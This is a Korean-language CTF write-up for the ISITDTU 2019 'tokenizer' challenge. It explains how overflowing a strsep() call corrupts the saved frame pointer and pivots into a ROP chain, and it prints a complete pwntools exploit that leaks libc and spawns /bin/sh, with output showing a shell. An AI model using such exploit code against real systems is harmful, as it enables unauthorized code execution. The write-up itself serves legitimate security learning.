# [WriteUp]ISITDTU CTF 2019 Quals - tokenizer

:black_nib:조성준(sjjo0225@gmail.com)

---

처음에는 감을 못 잡을 수 있지만, `strsep()`의 특징을 알면 생각보다 간단하게 풀리는 문제이다.

---

## What does tokenizer do?

`pd main`으로는 아무것도 나오지 않는다. 프로그램을 한 번 실행시켜서 `main()`과 서브루틴들을 찾아야 한다.

```bash
gdb-peda$ pd 0x40133c 0x401389
Dump of assembler code from 0x40133c to 0x401389::	Dump of assembler code from 0x40133c to 0x401389:
   0x000000000040133c:	push   rbp
   0x000000000040133d:	mov    rbp,rsp
   0x0000000000401340:	sub    rsp,0x10
   0x0000000000401344:	lea    rsi,[rip+0xffffffffffffffdc]        # 0x401327
   0x000000000040134b:	mov    edi,0xe
   0x0000000000401350:	call   0x4010a0 <signal@plt>
   0x0000000000401355:	mov    edi,0x3c
   0x000000000040135a:	call   0x4010e0 <alarm@plt>
   0x000000000040135f:	lea    rax,[rip+0xd2a]        # 0x402090
   0x0000000000401366:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000040136a:	mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040136e:	mov    rsi,rax
   0x0000000000401371:	lea    rdi,[rip+0x2ca8]        # 0x404020 <std::cout>
   0x0000000000401378:	call   0x401080 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
   0x000000000040137d:	call   0x401261
   0x0000000000401382:	mov    eax,0x0
   0x0000000000401387:	leave  
   0x0000000000401388:	ret    
End of assembler dump.
```

```bash
gdb-peda$ pd 0x401261 0x401327
Dump of assembler code from 0x401261 to 0x401327::	Dump of assembler code from 0x401261 to 0x401327:
   0x0000000000401261:	push   rbp
   0x0000000000401262:	mov    rbp,rsp
   0x0000000000401265:	sub    rsp,0x400
   0x000000000040126c:	lea    rsi,[rip+0xda5]        # 0x402018
   0x0000000000401273:	lea    rdi,[rip+0x2da6]        # 0x404020 <std::cout>
   0x000000000040127a:	call   0x401080 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
   0x000000000040127f:	lea    rsi,[rip+0x2fda]        # 0x404260
   0x0000000000401286:	lea    rdi,[rip+0x2eb3]        # 0x404140 <std::cin>
   0x000000000040128d:	call   0x401030 <std::basic_istream<char, std::char_traits<char> >& std::getline<char, std::char_traits<char>, std::allocator<char> >(std::basic_istream<char, std::char_traits<char> >&, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >&)@plt>
   0x0000000000401292:	lea    rdi,[rip+0x2fc7]        # 0x404260
   0x0000000000401299:	call   0x401040 <std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::c_str() const@plt>
   0x000000000040129e:	mov    rcx,rax
   0x00000000004012a1:	lea    rax,[rbp-0x400]
   0x00000000004012a8:	mov    edx,0x400
   0x00000000004012ad:	mov    rsi,rcx
   0x00000000004012b0:	mov    rdi,rax
   0x00000000004012b3:	call   0x401050 <strncpy@plt>
   0x00000000004012b8:	lea    rsi,[rip+0xd96]        # 0x402055
   0x00000000004012bf:	lea    rdi,[rip+0x2d5a]        # 0x404020 <std::cout>
   0x00000000004012c6:	call   0x401080 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
   0x00000000004012cb:	mov    rdx,rax
   0x00000000004012ce:	lea    rax,[rbp-0x400]
   0x00000000004012d5:	mov    rsi,rax
   0x00000000004012d8:	mov    rdi,rdx
   0x00000000004012db:	call   0x401080 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
   0x00000000004012e0:	lea    rsi,[rip+0xd87]        # 0x40206e
   0x00000000004012e7:	mov    rdi,rax
   0x00000000004012ea:	call   0x401080 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
   0x00000000004012ef:	lea    rsi,[rip+0xd7a]        # 0x402070
   0x00000000004012f6:	lea    rdi,[rip+0x2d23]        # 0x404020 <std::cout>
   0x00000000004012fd:	call   0x401080 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
   0x0000000000401302:	lea    rsi,[rip+0x2f77]        # 0x404280
   0x0000000000401309:	lea    rdi,[rip+0x2e30]        # 0x404140 <std::cin>
   0x0000000000401310:	call   0x401030 <std::basic_istream<char, std::char_traits<char> >& std::getline<char, std::char_traits<char>, std::allocator<char> >(std::basic_istream<char, std::char_traits<char> >&, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >&)@plt>
   0x0000000000401315:	lea    rax,[rbp-0x400]
   0x000000000040131c:	mov    rdi,rax
   0x000000000040131f:	call   0x4011d2
   0x0000000000401324:	nop
   0x0000000000401325:	leave  
   0x0000000000401326:	ret
```

```bash
gdb-peda$ pd 0x4011d2 0x401261
Dump of assembler code from 0x4011d2 to 0x401261::	Dump of assembler code from 0x4011d2 to 0x401261:
   0x00000000004011d2:	push   rbp
   0x00000000004011d3:	mov    rbp,rsp
   0x00000000004011d6:	sub    rsp,0x20
   0x00000000004011da:	mov    QWORD PTR [rbp-0x18],rdi
   0x00000000004011de:	lea    rsi,[rip+0xe24]        # 0x402009
   0x00000000004011e5:	lea    rdi,[rip+0x2e34]        # 0x404020 <std::cout>
   0x00000000004011ec:	call   0x401080 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
   0x00000000004011f1:	lea    rdi,[rip+0x3088]        # 0x404280
   0x00000000004011f8:	call   0x401040 <std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::c_str() const@plt>
   0x00000000004011fd:	mov    rdx,rax
   0x0000000000401200:	lea    rax,[rbp-0x18]
   0x0000000000401204:	mov    rsi,rdx
   0x0000000000401207:	mov    rdi,rax
   0x000000000040120a:	call   0x401060 <strsep@plt>
   0x000000000040120f:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401213:	cmp    QWORD PTR [rbp-0x8],0x0
   0x0000000000401218:	je     0x40125e
   0x000000000040121a:	mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040121e:	mov    rsi,rax
   0x0000000000401221:	lea    rdi,[rip+0x2df8]        # 0x404020 <std::cout>
   0x0000000000401228:	call   0x401080 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
   0x000000000040122d:	mov    esi,0xa
   0x0000000000401232:	mov    rdi,rax
   0x0000000000401235:	call   0x401090 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char)@plt>
   0x000000000040123a:	lea    rdi,[rip+0x303f]        # 0x404280
   0x0000000000401241:	call   0x401040 <std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::c_str() const@plt>
   0x0000000000401246:	mov    rdx,rax
   0x0000000000401249:	lea    rax,[rbp-0x18]
   0x000000000040124d:	mov    rsi,rdx
   0x0000000000401250:	mov    rdi,rax
   0x0000000000401253:	call   0x401060 <strsep@plt>
   0x0000000000401258:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000040125c:	jmp    0x401213
   0x000000000040125e:	nop
   0x000000000040125f:	leave  
   0x0000000000401260:	ret    
End of assembler dump.
```

`main()`과 2개의 서브루틴으로 이루어진 프로그램이다. 대충 분석해 보면 문자열을 입력받고 `0x400`바이트만큼 잘라서 스택에 넣은 후, delimiter를 입력받아서 `strsep()`를 호출하여 여러 개의 token들로 분할한다.

---

## Exploit plan

`strsep()`는 2개의 문자열 `str`과 `del`을 인자로 받는다. `str`의 앞에서부터 검사하여 `del`에 포함된 문자를 만나면 그 문자를 `\x00`로 바꾸고 검사한 위치까지의 문자열을 반환한다. 그런데 위의 프로그램에서 첫 번째 입력에 `0x400`바이트 이상의 문자열을 입력하면, `str`은 문자열의 주소이기 때문에 스택의 SFP까지 `strsep()`의 인자로 들어가게 된다. 만약 SFP의 LSB(Least Significant Bit)가 `del`에 포함되어 있다면 SFP의 값이 조작되고, 프로그램이 종료될 때 `leave; ret`을 세 번 연속으로 만나기 때문에 `rip`는 `str`문자열의 중간 어느 지점에 위치하게 된다. 그 위치에 RTL chain을 만들어 놓으면 ROP가 가능할 것이다.

첫 번째 ROP에서 libc leak을 수행하여 `system()`과 `"/bin/sh"`의 주소를 구한 뒤에 두 번째 실행에서 쉘을 얻어내면 될 것 같다.

---

```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : FULL
```

보호기법을 확인해 보면 PIE가 꺼져 있다. 즉, 바이너리에 들어 있는 값들은 항상 같은 위치에 매핑된다.

---

RTL에 필요한 가젯들을 찾아보자.

```bash
gdb-peda$ ropsearch "pop rdi"
Searching for ROP gadget: 'pop rdi' in: binary ranges
0x0040149b : (b'5fc3')	pop rdi; ret
gdb-peda$ ropsearch "pop rsi"
Searching for ROP gadget: 'pop rsi' in: binary ranges
0x00401499 : (b'5e415fc3')	pop rsi; pop r15; ret
gdb-peda$ ropsearch "ret"
Searching for ROP gadget: 'ret' in: binary ranges
0x00401016 : (b'c3')	ret
0x00401120 : (b'c3')	ret
0x00401150 : (b'c3')	ret
0x00401190 : (b'c3')	ret
0x004011ba : (b'c3')	ret
0x004011c0 : (b'c3')	ret
0x00401260 : (b'c3')	ret
0x00401326 : (b'c3')	ret
0x00401388 : (b'c3')	ret
0x00401419 : (b'c3')	ret
0x00401427 : (b'c3')	ret
0x0040143c : (b'c3')	ret
0x00401487 : (b'c3')	ret
0x0040149c : (b'c3')	ret
0x004014a0 : (b'c3')	ret
0x004014ac : (b'c3')	ret
```

---

libc leak을 위한 첫 번째 ROP가 끝난 후 리턴할 주소가 필요하다.

```bash
gdb-peda$ start

[----------------------------------registers-----------------------------------]
RAX: 0x1c 
RBX: 0x0 
RCX: 0x60 ('`')
RDX: 0x7ffff7de59a0 (<_dl_fini>:	push   rbp)
RSI: 0x7ffff7ffe700 --> 0x0 
RDI: 0x1 
RBP: 0x0 
RSP: 0x7fffffffe080 --> 0x1 
RIP: 0x4010f0 (xor    ebp,ebp)
R8 : 0x7ffff7a47d80 --> 0x0 
R9 : 0x0 
R10: 0x405010 --> 0x0 
R11: 0x0 
R12: 0x4010f0 (xor    ebp,ebp)
R13: 0x7fffffffe080 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4010e0 <alarm@plt>:	jmp    QWORD PTR [rip+0x2ef2]        # 0x403fd8
   0x4010e6 <alarm@plt+6>:	push   0xb
   0x4010eb <alarm@plt+11>:	jmp    0x401020
=> 0x4010f0:	xor    ebp,ebp
   0x4010f2:	mov    r9,rdx
   0x4010f5:	pop    rsi
   0x4010f6:	mov    rdx,rsp
   0x4010f9:	and    rsp,0xfffffffffffffff0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe080 --> 0x1 
0008| 0x7fffffffe088 --> 0x7fffffffe3b0 ("/home/josj0225/ISITDTU2019/tokenizer")
0016| 0x7fffffffe090 --> 0x0 
0024| 0x7fffffffe098 --> 0x7fffffffe3d5 ("CLUTTER_IM_MODULE=xim")
0032| 0x7fffffffe0a0 --> 0x7fffffffe3eb ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
0040| 0x7fffffffe0a8 --> 0x7fffffffe9d7 ("LESSCLOSE=/usr/bin/lesspipe %s %s")
0048| 0x7fffffffe0b0 --> 0x7fffffffe9f9 ("XDG_MENU_PREFIX=gnome-")
0056| 0x7fffffffe0b8 --> 0x7fffffffea10 ("_=/usr/bin/gdb")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Temporary breakpoint 1, 0x00000000004010f0 in ?? ()
```

`__libc_start_main` 이전에 실행되는 함수로 리턴하도록 하면 될 것 같다.

---

ASLR이 걸려 있기 때문에 어느 정도의 브루트포싱이 필요하다. SFP의 LSB가 가질 수 있는 값은 `0x00`, `0x10`, ... , `0xf0`으로 총 16가지이다. 이 중 한 경우를 가정하고 익스플로잇을 짜야 한다. RTL chain이 SFP를 덮으면 안 되기 때문에 적당히 큰 값으로 선택하자.(디버깅할 때 16배 정도 귀찮다는 문제점이 발생한다.)

```python
# exploit_tokenizer.py

from pwn import *

e = ELF("./tokenizer")

addr_strsep_got = e.got["strsep"] # GOT address of strsep()
offset_strsep = 0x6551b0 # offset of strsep() from libc base
offset_system = 0x605440 # offset of system() from libc base
offset_binsh = 0x769e9a # offset of "/bin/sh" from libc base
addr_start = 0x4010f0
pop_rdi = 0x40149b # address of "pop rdi; ret" gadget
pop_rsi_r15 = 0x401499 # address of "pop rsi; pop r15; ret" gadget
ret = 0x401016 # address of "ret" gadget
std_cout = 0x404020 # <std::cout>
std_basic_ostream = 0x401080 # <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
key = 0xb0

payload = "A" * 0x378
payload += p64(pop_rdi)
payload += p64(std_cout)
payload += p64(pop_rsi_r15)
payload += p64(addr_strsep_got)
payload += p64(0)
payload += p64(std_basic_ostream)
payload += p64(addr_start)
payload += "A" * 0x50

payload = payload.replace('\x00', chr(key))

p = process("./tokenizer")

p.sendlineafter("characters): ", payload)
SFP = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
log.info("SFP: " + hex(SFP))
p.sendlineafter("delimiters: ", chr(key))
p.recvuntil('\x7f')

addr_libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - offset_strsep
log.info("address of libc base: " + hex(addr_libc))
addr_system = addr_libc + offset_system
log.info("address of system(): " + hex(addr_system))
addr_binsh = addr_libc + offset_binsh
log.info("address of /bin/sh: " + hex(addr_binsh))
```

첫 번째 ROP까지의 코드이다. RTL chain은 SFP+`0x8`부터 구성하면 된다. rbp+`0x8`에 return address가 위치하기 때문이다.

이 프로그램은 C++로 짜였기 때문에 출력 방식이 C와 약간 다르다. 여러 함수들이 포함된 라이브러리가 함수의 역할을 한다. `0x40135f`부터 `0x401378`까지를 참고하여 같은 방식으로 RTL chain을 구성해 주면 된다.

---

ROP가 실행된 후에 다시 서브루틴으로 들어오면 SFP의 LSB는 `0x60`이다. 디버깅해서 한 줄씩 따라가다 보면 알 수 있다. 이 값은 첫 번째 ROP가 실행된 후에 스택에 바로 쌓이기 때문에 고정된 값이다.

최종 익스플로잇은 다음과 같다.

```python
# exploit_tokenizer.py

from pwn import *

e = ELF("./tokenizer")

addr_strsep_got = e.got["strsep"] # GOT address of strsep()
offset_strsep = 0x6551b0 # offset of strsep() from libc base
offset_system = 0x605440 # offset of system() from libc base
offset_binsh = 0x769e9a # offset of "/bin/sh" from libc base
addr_start = 0x4010f0
pop_rdi = 0x40149b # address of "pop rdi; ret" gadget
pop_rsi_r15 = 0x401499 # address of "pop rsi; pop r15; ret" gadget
ret = 0x401016 # address of "ret" gadget
std_cout = 0x404020 # <std::cout>
std_basic_ostream = 0x401080 # <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
key = 0xb0

payload = "A" * 0x378
payload += p64(pop_rdi)
payload += p64(std_cout)
payload += p64(pop_rsi_r15)
payload += p64(addr_strsep_got)
payload += p64(0)
payload += p64(std_basic_ostream)
payload += p64(addr_start)
payload += "A" * 0x50

payload = payload.replace('\x00', chr(key))

p = process("./tokenizer")

p.sendlineafter("characters): ", payload)
SFP = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
log.info("SFP: " + hex(SFP))
p.sendlineafter("delimiters: ", chr(key))
p.recvuntil('\x7f')

addr_libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - offset_strsep
log.info("address of libc base: " + hex(addr_libc))
addr_system = addr_libc + offset_system
log.info("address of system(): " + hex(addr_system))
addr_binsh = addr_libc + offset_binsh
log.info("address of /bin/sh: " + hex(addr_binsh))

key = 0x60

payload = "A" * 0x3c8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(addr_binsh)
payload += p64(addr_system)
payload += "A" * 0x18

payload = payload.replace('\x00', chr(key))

p.sendlineafter("characters): ", payload)
p.sendlineafter("delimiters: ", chr(key))

p.interactive()
```

---

```bash
$ python exploit_tokenizer.py
[*] '/home/josj0225/ISITDTU2019/tokenizer'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './tokenizer': pid 4988
[*] SFP: 0x7ffc4b721cb0
[*] address of libc base: 0x7fb7617e6000
[*] address of system(): 0x7fb761deb440
[*] address of /bin/sh: 0x7fb761f4fe9a
[*] Switching to interactive mode
Tokens:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x16\x10@




\x9b\x14@




\x9a\xfe�a�

@\xb4�a\xb7\x7f

AAAAAAAAAAAAAAAAAAAAAAAA
\x1brK�
$        id
uid=1000(cappit) gid=1000(cappit) groups=1000(cappit),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
```

계속 실행하다 보면 EOFerror의 향연 속에서 이런 반가운 화면을 맞이할 수 있을 것이다.